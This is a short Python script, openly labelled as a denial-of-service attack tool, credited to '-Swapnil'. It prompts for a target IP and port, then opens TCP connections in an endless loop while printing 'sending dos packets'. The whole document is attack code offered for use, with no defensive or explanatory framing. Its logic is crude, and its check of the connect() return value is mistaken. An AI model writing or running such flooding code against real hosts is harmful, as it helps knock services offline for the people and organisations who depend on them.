# simple python script for dos attack on a specific port
'''Created by -Swapnil'''

import socket
import sys

def DOS(host,port):		
	
	while True:
		
		try:
			computer = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			
			conn= computer.connect((host,port))
			if (not conn):
				print('sending dos packets')
			else:
				print('port not open')
				break

			computer.close()
		except:
			print("invalid host or Host is down...")

host = input("Host IP: ")
port = int(input("Port: "))

DOS(host,port)


